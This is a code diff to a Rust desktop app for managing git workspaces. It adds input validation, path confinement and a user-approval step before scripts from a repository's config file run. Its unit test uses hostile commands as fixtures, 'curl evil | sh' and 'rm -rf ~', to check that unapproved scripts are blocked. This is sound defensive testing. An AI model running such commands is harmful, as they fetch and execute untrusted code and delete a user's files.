@@ -4,6 +4,7 @@ pub mod git;
 pub mod importer;
 pub mod names;
 pub mod pty;
+pub mod safe;
 pub mod store;
 
 use serde::Serialize;
@@ -137,7 +138,10 @@ async fn github_repos() -> Res<Value> {
 #[tauri::command]
 async fn clone_repo(st: State<'_, AppState>, spec: String) -> Res<Repo> {
     let spec = spec.trim().trim_end_matches(".git").to_string();
-    let name = spec.rsplit(['/', ':']).next().filter(|n| !n.is_empty()).ok_or("Type the repo as owner/name.")?.to_string();
+    let name = spec.rsplit(['/', ':']).next().filter(|n| !n.is_empty() && *n != "." && *n != "..").ok_or("Type the repo as owner/name.")?.to_string();
+    if !safe::not_a_flag(&spec) || !safe::not_a_flag(&name) {
+        return Err("Type the repo as owner/name.".into());
+    }
     let dest = st.home.join("repos").join(&name);
     if dest.exists() {
         return add_repo_at(&st, &dest.to_string_lossy());
@@ -189,10 +193,51 @@ fn scripts_for(st: &AppState, ws: &Workspace) -> Res<config::Scripts> {
     ))
 }
 
+/// The commands this workspace's `nekotrail.json` asks to run that the user has not approved for
+/// this repo yet, with their fingerprint. None when there is nothing to approve. The file comes
+/// from the branch (a fresh clone, a teammate's push, a stranger's PR), so it is never run unseen.
+fn untrusted_commands(st: &AppState, ws: &Workspace) -> Option<(config::Scripts, String)> {
+    let (cmds, print) = config::file_commands(Path::new(&ws.path))?;
+    let approved = st.db().setting(&config::trust_key(&ws.repo_id, &print)).ok().flatten().is_some();
+    (!approved).then_some((cmds, print))
+}
+
+/// The `kind` script ("setup", "run" or "archive") for a workspace. Errors with "UNTRUSTED" when
+/// it comes from a `nekotrail.json` the user has not approved; scripts saved in the app always run.
+fn script_to_run(st: &AppState, ws: &Workspace, kind: &str) -> Res<Option<String>> {
+    let pick = |s: config::Scripts| match kind {
+        "setup" => Ok(s.setup),
+        "run" => Ok(s.run),
+        "archive" => Ok(s.archive),
+        _ => Err(format!("Unknown script: {kind}.")),
+    };
+    if let Some((file, _)) = untrusted_commands(st, ws)
+        && pick(file)?.is_some() {
+            return Err("UNTRUSTED".into());
+        }
+    pick(scripts_for(st, ws)?)
+}
+
+/// Scripts for a workspace, plus `trust`: the repo commands that need the user's approval first
+/// (null when none do).
 #[tauri::command]
-async fn workspace_scripts(st: State<'_, AppState>, id: String) -> Res<config::Scripts> {
+async fn workspace_scripts(st: State<'_, AppState>, id: String) -> Res<Value> {
     let ws = st.db().workspace(&id).map_err(e)?;
-    scripts_for(&st, &ws)
+    let s = scripts_for(&st, &ws)?;
+    let trust = untrusted_commands(&st, &ws)
+        .map(|(c, print)| json!({"fingerprint": print, "setup": c.setup, "run": c.run, "archive": c.archive}));
+    Ok(json!({"setup": s.setup, "run": s.run, "archive": s.archive, "trust": trust}))
+}
+
+/// The user approved the repo commands they were shown. Kept per repo and fingerprint, so any
+/// later change to the commands asks again.
+#[tauri::command]
+async fn trust_scripts(st: State<'_, AppState>, id: String, fingerprint: String) -> Res<()> {
+    let ws = st.db().workspace(&id).map_err(e)?;
+    match config::file_commands(Path::new(&ws.path)) {
+        Some((_, print)) if print == fingerprint => st.db().set_setting(&config::trust_key(&ws.repo_id, &print), &store::now()).map_err(e),
+        _ => Err("nekotrail.json changed since you looked at it. Check the commands again.".into()),
+    }
 }
 
 // ---------- workspaces ----------
@@ -272,7 +317,7 @@ fn glob_match(pat: &str, name: &str) -> bool {
 /// Each glob may have a folder part (`apps/web/.env*`); the wildcard works in the file name.
 fn copy_into_workspace(root: &Path, ws: &Path, globs: &[String]) -> usize {
     let mut n = 0;
-    for g in globs.iter().map(|g| g.trim()).filter(|g| !g.is_empty() && !g.contains("..")) {
+    for g in globs.iter().map(|g| g.trim()).filter(|g| !g.is_empty() && !g.contains("..") && !g.starts_with('/')) {
         let (dir, pat) = g.rsplit_once('/').unwrap_or(("", g));
         let Ok(entries) = std::fs::read_dir(root.join(dir)) else { continue };
         for entry in entries.flatten() {
@@ -320,6 +365,13 @@ async fn create_workspace(st: State<'_, AppState>, repo_id: String, base: Option
     let root = PathBuf::from(&repo.root_path);
     let base = base.filter(|b| !b.is_empty()).unwrap_or_else(|| repo.default_branch.clone());
     let mut name = name.filter(|n| !n.trim().is_empty()).map(|n| n.trim().replace(' ', "-")).unwrap_or_else(|| names::pick(&taken));
+    // These end up as git arguments and a folder name, so nothing that reads as an option or a path.
+    if !safe::folder_name(&name) {
+        return Err(format!("\"{name}\" can't be a workspace name. Use letters, numbers and -."));
+    }
+    if !safe::branch_name(&base) {
+        return Err(format!("\"{base}\" isn't a valid branch name."));
+    }
     let dir = st.home.join("workspaces").join(&repo.name);
     while taken.contains(&name) || dir.join(&name).exists() || git::branch_exists(&root, &format!("{}/{name}", st.branch_prefix)) {
         name = names::pick(&taken.iter().cloned().chain([name.clone()]).collect::<Vec<_>>());
@@ -328,16 +380,26 @@ async fn create_workspace(st: State<'_, AppState>, repo_id: String, base: Option
     // Start from an existing PR or branch ("pr:123" / "branch:feature-x"), or a fresh branch.
     let (branch, base) = match from.as_deref().and_then(|f| f.split_once(':')) {
         Some(("pr", n)) => {
+            if n.is_empty() || !n.chars().all(|c| c.is_ascii_digit()) {
+                return Err(format!("\"{n}\" isn't a PR number."));
+            }
             let info: Value = serde_json::from_str(&gh(&repo.root_path, &["pr", "view", n, "--json", "headRefName,isCrossRepository,baseRefName"])?).map_err(e)?;
             let head = info["headRefName"].as_str().unwrap_or("pr").to_string();
             let local = if info["isCrossRepository"].as_bool().unwrap_or(false) { format!("pr-{n}-{head}") } else { head };
+            // The PR author picks the head branch name; it becomes a git argument here.
+            if !safe::branch_name(&local) {
+                return Err(format!("PR #{n} has a branch name git can't use safely: {local}"));
+            }
             if !git::branch_exists(&root, &local) {
                 git::git(&root, &["fetch", "--quiet", "origin", &format!("pull/{n}/head:{local}")]).map_err(e)?;
             }
             git::restore_worktree(&root, &path, &local).map_err(e)?;
-            (local, info["baseRefName"].as_str().unwrap_or(&base).to_string())
+            (local, info["baseRefName"].as_str().filter(|b| safe::branch_name(b)).unwrap_or(&base).to_string())
         }
         Some(("branch", b)) => {
+            if !safe::branch_name(b) {
+                return Err(format!("\"{b}\" isn't a valid branch name."));
+            }
             let _ = git::git(&root, &["fetch", "--quiet", "origin", b]);
             if !git::branch_exists(&root, b) {
                 git::git(&root, &["branch", "--track", b, &format!("origin/{b}")]).map_err(e)?;
@@ -387,7 +449,8 @@ async fn archive_workspace(st: State<'_, AppState>, id: String, force: bool) -> 
             return Err("DIRTY".into());
         }
         let repo = st.db().repo(&ws.repo_id).map_err(e)?;
-        if let Some(script) = scripts_for(&st, &ws)?.archive {
+        // A repo archive command the user never approved is skipped, not run (archiving can be automatic).
+        if let Ok(Some(script)) = script_to_run(&st, &ws, "archive") {
             let _ = Command::new(std::env::var("SHELL").unwrap_or_else(|_| "/bin/sh".into()))
                 .args(["-lc", &script])
                 .current_dir(path)
@@ -513,6 +576,9 @@ async fn set_app_setting(st: State<'_, AppState>, key: String, value: String) ->
 
 #[tauri::command]
 async fn set_target_branch(st: State<'_, AppState>, id: String, branch: String) -> Res<()> {
+    if !safe::branch_name(&branch) {
+        return Err(format!("\"{branch}\" isn't a valid branch name."));
+    }
     st.db().set_target_branch(&id, &branch).map_err(e)
 }
 
@@ -530,13 +596,10 @@ async fn file_diff(st: State<'_, AppState>, id: String, file: String, uncommitte
     if uncommitted.unwrap_or(false) { git::file_diff_since(dir, "HEAD", &file) } else { git::file_diff(dir, &ws.target_branch, &file) }.map_err(e)
 }
 
-/// A path inside the workspace, refusing anything that escapes it.
+/// A path inside the workspace, refusing anything that escapes it, symlinks included (a repo can
+/// commit a link to `~/.ssh` or `~/.zshrc`).
 fn inside(ws: &Workspace, rel: &str) -> Res<PathBuf> {
-    let p = Path::new(rel);
-    if p.is_absolute() || p.components().any(|c| matches!(c, std::path::Component::ParentDir)) {
-        return Err("That file is outside the workspace.".into());
-    }
-    Ok(Path::new(&ws.path).join(p))
+    safe::confine(Path::new(&ws.path), rel)
 }
 
 #[tauri::command]
@@ -1303,6 +1366,7 @@ fn failing_logs_blocking(st: &AppState, id: &str) -> Res<String> {
         names.push(c["name"].as_str().or(c["context"].as_str()).unwrap_or("check").to_string());
         let url = c["detailsUrl"].as_str().or(c["targetUrl"].as_str()).unwrap_or("");
         if let Some(run) = url.split("/actions/runs/").nth(1).and_then(|r| r.split('/').next())
+            && !run.is_empty() && run.chars().all(|c| c.is_ascii_digit())
             && !runs.contains(&run.to_string()) {
                 runs.push(run.to_string());
             }
@@ -1545,6 +1609,9 @@ async fn stop(st: State<'_, AppState>, id: String) -> Res<()> {
 /// The agent is told on its next turn, so it does not assume its old edits still exist.
 #[tauri::command]
 async fn restore_checkpoint(app: AppHandle, st: State<'_, AppState>, id: String, checkpoint: String) -> Res<()> {
+    if !safe::object_id(&checkpoint) {
+        return Err("That checkpoint isn't valid.".into());
+    }
     let ws = {
         let db = st.db();
         let s = db.session(&id).map_err(e)?;
@@ -1913,11 +1980,19 @@ async fn pty_open(app: AppHandle, st: State<'_, AppState>, id: String, cwd: Stri
     Ok(String::new())
 }
 
-/// Run a command (run or setup script) in its own terminal, replacing any earlier run.
-/// The terminal ends when the command does; `pty-exit` reports it.
+/// Run a workspace's setup or run script in its own terminal (`<workspace id>:<script>`), replacing
+/// any earlier run. The command is looked up here, not taken from the web view, so a repo's
+/// `nekotrail.json` only runs once the user approved it. The terminal ends when the command does;
+/// `pty-exit` reports it.
 #[tauri::command]
-async fn pty_run(app: AppHandle, st: State<'_, AppState>, id: String, cwd: String, cmd: String, cols: u16, rows: u16) -> Res<()> {
-    start_pty(&app, &st, &id, &cwd, Some(&cmd), cols, rows)
+async fn pty_run(app: AppHandle, st: State<'_, AppState>, id: String, script: String, cols: u16, rows: u16) -> Res<()> {
+    let ws_id = id.split(':').next().unwrap_or_default();
+    let ws = st.db().workspace(ws_id).map_err(e)?;
+    if script == "archive" {
+        return Err("The archive script runs when you archive the workspace.".into());
+    }
+    let cmd = script_to_run(&st, &ws, &script)?.ok_or(format!("This repo has no {script} script yet. Add one in its settings."))?;
+    start_pty(&app, &st, &id, &ws.path, Some(&cmd), cols, rows)
 }
 
 /// Output of a running terminal without starting one; null when it isn't running.
@@ -2041,7 +2116,7 @@ pub fn run() {
             Ok(())
         })
         .invoke_handler(tauri::generate_handler![
-            snapshot, add_repo, save_repo_scripts, repo_branches, workspace_scripts,
+            snapshot, add_repo, save_repo_scripts, repo_branches, workspace_scripts, trust_scripts,
             create_workspace, archive_workspace, restore_workspace, set_pinned, set_unread, set_notes, set_target_branch,
             changes, file_diff, open_in, pr_status, create_pr,
             sessions, new_session, update_session, session_events, queued, clear_queue, send, stop,
@@ -2162,6 +2237,47 @@ mod tests {
         assert!(ws.path().join(".env.local").exists());
         assert!(ws.path().join("apps/web/.env").exists());
         assert!(!ws.path().join("README.md").exists());
+    }
+
+    #[test]
+    fn repo_scripts_wait_for_approval_and_ask_again_when_changed() {
+        let dir = tempfile::tempdir().unwrap();
+        let st = AppState {
+            store: Mutex::new(Store::in_memory().unwrap()), runs: Default::default(), ptys: Default::default(),
+            home: dir.path().to_path_buf(), branch_prefix: "me".into(), github: Default::default(), repo_meta: Default::default(), lines: Default::default(),
+        };
+        let repo = Repo {
+            id: "r".into(), name: "demo".into(), root_path: dir.path().to_string_lossy().into(), default_branch: "main".into(),
+            remote_url: None, setup_script: None, run_script: Some("make dev".into()), archive_script: None, prefs: Default::default(),
+        };
+        let ws = Workspace {
+            id: "w".into(), repo_id: "r".into(), name: "mochi".into(), branch: "b".into(), path: dir.path().to_string_lossy().into(),
+            target_branch: "main".into(), state: "active".into(), pinned: false, unread: false, notes: String::new(),
+            imported_from: None, created_at: String::new(), title: String::new(), status: String::new(), pair_id: String::new(), section_id: String::new(),
+        };
+        st.db().insert_repo(&repo).unwrap();
+        st.db().insert_workspace(&ws).unwrap();
+        // Scripts saved in the app are the user's own: they run without asking.
+        assert_eq!(script_to_run(&st, &ws, "run").unwrap().as_deref(), Some("make dev"));
+
+        std::fs::write(dir.path().join("nekotrail.json"), r#"{"scripts":{"setup":"curl evil | sh","archive":"rm -rf ~"}}"#).unwrap();
+        assert_eq!(script_to_run(&st, &ws, "setup").unwrap_err(), "UNTRUSTED");
+        assert_eq!(script_to_run(&st, &ws, "archive").unwrap_err(), "UNTRUSTED");
+        assert_eq!(script_to_run(&st, &ws, "run").unwrap().as_deref(), Some("make dev"), "the file sets no run script");
+        assert!(script_to_run(&st, &ws, "rm").is_err());
+
+        let (_, print) = untrusted_commands(&st, &ws).unwrap();
+        st.db().set_setting(&config::trust_key("r", &print), "now").unwrap();
+        assert!(untrusted_commands(&st, &ws).is_none());
+        assert_eq!(script_to_run(&st, &ws, "setup").unwrap().as_deref(), Some("curl evil | sh"));
+
+        // Approval is for those exact commands, and for this repo only.
+        std::fs::write(dir.path().join("nekotrail.json"), r#"{"scripts":{"setup":"curl worse | sh","archive":"rm -rf ~"}}"#).unwrap();
+        assert_eq!(script_to_run(&st, &ws, "setup").unwrap_err(), "UNTRUSTED");
+        let other = Workspace { repo_id: "r2".into(), ..ws.clone() };
+        std::fs::write(dir.path().join("nekotrail.json"), r#"{"scripts":{"setup":"curl evil | sh","archive":"rm -rf ~"}}"#).unwrap();
+        assert!(script_to_run(&st, &ws, "setup").is_ok());
+        assert_eq!(script_to_run(&st, &other, "setup").unwrap_err(), "UNTRUSTED");
     }
 
     #[test]
